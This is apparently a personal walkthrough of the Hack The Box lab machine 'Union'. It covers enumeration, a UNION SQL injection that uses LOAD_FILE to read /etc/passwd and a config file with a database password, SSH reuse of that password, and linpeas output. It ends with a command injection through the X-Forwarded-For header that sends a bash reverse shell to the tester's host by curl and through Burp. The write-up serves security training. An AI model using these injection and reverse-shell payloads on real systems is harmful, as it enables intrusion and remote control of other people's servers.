######
Union
Union is an medium difficulty linux machine featuring a web application that is vulnerable to SQL Injection
There are filters in place which prevent SQLMap from dumping the database. Users are intended to manually craft union statements to extract information from the database and website source code. 
Once on the machine, users can examine the source code of the web application and find out by setting the X-FORWARDED-FOR header, 
they can perform command injection on the system command used by the webserver to whitelist IP Addresses.
######

1-Enummeration:
    └─$ nmap -T2 -sV -sC -Pn 10.129.96.75 -v

        PORT   STATE SERVICE VERSION
        80/tcp open  http    nginx 1.18.0 (Ubuntu)
        |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
        | http-methods: 
        |_  Supported Methods: GET HEAD POST
        | http-cookie-flags: 
        |   /: 
        |     PHPSESSID: 
        |_      httponly flag not set
        |_http-server-header: nginx/1.18.0 (Ubuntu)
        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


    nikto -h  http://10.129.96.75:80
        + /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
        + No CGI Directories found (use '-C all' to force check all possible dirs)
        + nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
        + /config.php: PHP Config file may contain database IDs and passwords.
        + /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.

        http://10.129.96.75/config.php


        + /challenge.php/.tools/phpMyAdmin/current/db_details_importdocsql.php?submit_show=true&do=import&docpath=../: phpMyAdmin allows directory listings remotely
        phpMyAdmin allows directory listings remotely.



    SQL Injection :
        sqlQuery.txt contains a POST query copied via BurpSuite
        └──╼ [★]$ sqlmap -r sqlQuery.txt --dump

        ──╼ [★]$ sqlmap -r sqlQuery.txt --dump
             [CRITICAL] all tested parameters do not appear to be injectable.


    Via BurpSuite we add SQL Query - LOAD_FILE:
        POST /index.php HTTP/1.1
        Host: 10.129.96.75
        Content-Length: 47
        X-Requested-With: XMLHttpRequest
        Accept-Language: en-US,en;q=0.9
        Accept: */*
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
        Origin: http://10.129.96.75
        Referer: http://10.129.96.75/
        Accept-Encoding: gzip, deflate, br
        Cookie: PHPSESSID=5ck1bt4j1kfl3v2tbc9o4dp68i
        Connection: keep-alive

        player='+UNION+SELECT+LOAD_FILE("/etc/passwd")#


    This give us the result of /etc/passwd:
        sorry, root:x:0:0:root:/root:/bin/bash
        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
        bin:x:2:2:bin:/bin:/usr/sbin/nologin
        .......
        htb:x:1000:1000:htb:/home/htb:/bin/bash
        uhc:x:1001:1001:,,,:/home/uhc:/bin/bash


    3 users:
        root:x:0:0:root:/root:/bin/bash
        htb:x:1000:1000:htb:/home/htb:/bin/bash
        uhc:x:1001:1001:,,,:/home/uhc:/bin/bash

    in Burp - We will try to load the config.php file via the SQL Query and use Repeater again:

        player='+UNION+SELECT+LOAD_FILE("/var/www/html/config.php")#

    200 Response:
        HTTP/1.1 200 OK
            Server: nginx/1.18.0 (Ubuntu)
            Date: Mon, 20 Oct 2025 20:06:38 GMT

            Sorry, <?php
            session_start();
            $servername = "127.0.0.1";
            $username = "uhc";
            $password = "uhc-11qual-global-pw";
            $dbname = "november";

    So now we can use it as ssh access:
        ssh uhc@10.129.96.75


2-Enum + Priv Escalation:
    uhc@union:~$ whoami
        uhc

    Kali:
        python3 -m http.server

    Vuln Machine:
        uhc@union:~$ wget http://10.10.15.69:8000/linpeas.sh
        chmod +x linpeas.sh
        ./linpeas.sh

            Results:

                                        ╔════════════════════╗
            ══════════════════════════════╣ System Information ╠══════════════════════════════
                                        ╚════════════════════╝
            ╔══════════╣ Operative system
            ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
            Linux version 5.4.0-77-generic (buildd@lgw01-amd64-028) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #86-Ubuntu SMP Thu Jun 17 02:35:03 UTC 2021
            Distributor ID:	Ubuntu
            Description:	Ubuntu 20.04.3 LTS
            Release:	20.04
            Codename:	focal

            ╔══════════╣ Sudo version
            ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
            Sudo version 1.8.31



            passwd file: /etc/pam.d/passwd
            passwd file: /etc/passwd
            passwd file: /usr/share/bash-completion/completions/passwd
            passwd file: /usr/share/lintian/overrides/passwd
            /var/lib/pam/password


            /usr/share/openssh/sshd_config



            SUID:
                ╔══════════╣ SUID - Check easy privesc, exploits and write perms
                ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
                strings Not Found
                -rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
                -rwsr-xr-x 1 root root 39K Mar  7  2020 /usr/bin/fusermount
                -rwsr-xr-x 1 root root 31K May 26  2021 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
                -rwsr-xr-x 1 root root 163K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
                -rwsr-xr-x 1 root root 67K Jul 21  2020 /usr/bin/su
                -rwsr-xr-x 1 root root 55K Jul 21  2020 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
                -rwsr-xr-x 1 root root 39K Jul 21  2020 /usr/bin/umount  --->  BSD/Linux(08-1996)
                -rwsr-xr-x 1 root root 44K Jul 14  2021 /usr/bin/newgrp  --->  HP-UX_10.20
                -rwsr-xr-x 1 root root 84K Jul 14  2021 /usr/bin/chfn  --->  SuSE_9.3/10
                -rwsr-xr-x 1 root root 52K Jul 14  2021 /usr/bin/chsh
                -rwsr-xr-x 1 root root 87K Jul 14  2021 /usr/bin/gpasswd
                -rwsr-xr-x 1 root root 67K Jul 14  2021 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)

                ╔══════════╣ SGID
                ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
                -rwsr-sr-x 1 daemon daemon 55K Nov 12  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)



    Also find a FireWall.php conf in www/html:
        uhc@union:/var/www/html$ cat firewall.php


        uhc@union:/var/www/html$ cat firewall.php
                <?php
                require('config.php');

                if (!($_SESSION['Authenticated'])) {  --- We wil NEED the COOKIE SESSIONS
                echo "Access Denied";
                exit;
                }
                <?php
                if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
                } else {
                    $ip = $_SERVER['REMOTE_ADDR'];
                };
                system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");  ---- Allow nc listenner for a remote shell
                ?>
                            <h1 class="text-white">Welcome Back!</h1>
                            <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
                        </div>
                    </section>
                </div>


        Cookies Session From burp:
            PHPSESSID=5ck1bt4j1kfl3v2tbc9o4dp68i

        in Kali:
            nc -lvnp 4443

            curl -X GET -H 'X-FORWARDED-FOR: ; bash -c "bash -i >& /dev/tcp/10.10.15.69/4443 0>&1";' --cookie "PHPSESSID=5ck1bt4j1kfl3v2tbc9o4dp68i" 'http://10.129.96.75/firewall.php'   

        OR VIA Burp Suite request to firewall.php page at the end of the GET query page:
            X-FORWARDED-FOR: ;bash -c 'bash -i >& /dev/tcp/10.10.15.69/4443 0>&1';


        
